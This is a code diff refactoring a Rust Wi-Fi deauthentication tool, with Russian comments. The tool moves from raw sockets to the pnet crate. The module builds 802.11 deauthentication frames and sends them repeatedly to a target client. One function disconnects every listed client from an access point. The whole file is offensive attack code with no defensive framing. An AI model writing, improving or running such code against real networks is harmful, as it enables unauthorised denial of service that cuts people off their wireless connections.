@@ -1,10 +1,8 @@
 use anyhow::Result;
-use pcap::Packet;
-use std::net::MacAddr;
-use std::process::Command;
+use pnet::datalink::{self};
+use log::info;
 
-/// Структура для деаутентификационного пакета
-#[repr(packed)]
+#[derive(Debug)]
 struct DeauthPacket {
     frame_control: u16,
     duration: u16,
@@ -16,13 +14,13 @@ struct DeauthPacket {
 }
 
 impl DeauthPacket {
-    fn new(destination: MacAddr, source: MacAddr, bssid: MacAddr) -> Self {
+    fn new(destination: [u8; 6], source: [u8; 6], bssid: [u8; 6]) -> Self {
         DeauthPacket {
             frame_control: 0x00C0, // Type: Management, Subtype: Deauthentication
             duration: 0,
-            destination: destination.octets(),
-            source: source.octets(),
-            bssid: bssid.octets(),
+            destination,
+            source,
+            bssid,
             sequence: 0,
             reason: 0x0007, // Class 3 frame received from nonassociated station
         }
@@ -30,22 +28,20 @@ impl DeauthPacket {
 }
 
 /// Отправка деаутентификационного пакета
-pub fn send_deauth(interface: &str, target_mac: MacAddr, ap_mac: MacAddr) -> Result<()> {
-    // Создаем raw сокет
-    let socket = socket2::Socket::new(
-        socket2::Domain::PACKET,
-        socket2::Type::RAW,
-        Some(socket2::Protocol::ETH_P_ALL),
-    )?;
-
-    // Привязываем сокет к интерфейсу
-    let iface = pcap::Device::list()?
+pub fn send_deauth(interface: &str, target_mac: [u8; 6], ap_mac: [u8; 6]) -> Result<()> {
+    // Получаем сетевой интерфейс
+    let interfaces = datalink::interfaces();
+    let interface = interfaces
         .into_iter()
-        .find(|d| d.name == interface)
+        .find(|iface| iface.name == interface)
         .ok_or_else(|| anyhow::anyhow!("Interface not found"))?;
 
-    let addr = socket2::SockAddr::packet(iface.addresses[0].addr.unwrap());
-    socket.bind(&addr)?;
+    // Создаем канал для отправки пакетов
+    let (mut tx, _) = match datalink::channel(&interface, Default::default()) {
+        Ok(datalink::Channel::Ethernet(tx, rx)) => (tx, rx),
+        Ok(_) => return Err(anyhow::anyhow!("Unsupported channel type")),
+        Err(e) => return Err(anyhow::anyhow!("Error creating channel: {}", e)),
+    };
 
     // Создаем и отправляем пакеты
     let deauth_packet = DeauthPacket::new(target_mac, ap_mac, ap_mac);
@@ -58,7 +54,11 @@ pub fn send_deauth(interface: &str, target_mac: MacAddr, ap_mac: MacAddr) -> Res
 
     // Отправляем пакет несколько раз для надежности
     for _ in 0..10 {
-        socket.send(packet_bytes)?;
+        match tx.send_to(packet_bytes, None) {
+            Some(Ok(_)) => (),
+            Some(Err(e)) => return Err(anyhow::anyhow!("Failed to send packet: {}", e)),
+            None => return Err(anyhow::anyhow!("Failed to send packet: channel closed")),
+        }
         std::thread::sleep(std::time::Duration::from_millis(100));
     }
 
@@ -66,9 +66,9 @@ pub fn send_deauth(interface: &str, target_mac: MacAddr, ap_mac: MacAddr) -> Res
 }
 
 /// Деаутентификация всех клиентов точки доступа
-pub fn deauth_all_clients(interface: &str, ap_mac: MacAddr, clients: &[MacAddr]) -> Result<()> {
+pub fn deauth_all_clients(interface: &str, ap_mac: [u8; 6], clients: &[[u8; 6]]) -> Result<()> {
     for client in clients {
-        info!("Отправка деаутентификационного пакета клиенту {}", client);
+        info!("Отправка деаутентификационного пакета клиенту {:02X?}", client);
         send_deauth(interface, *client, ap_mac)?;
     }
     Ok(())
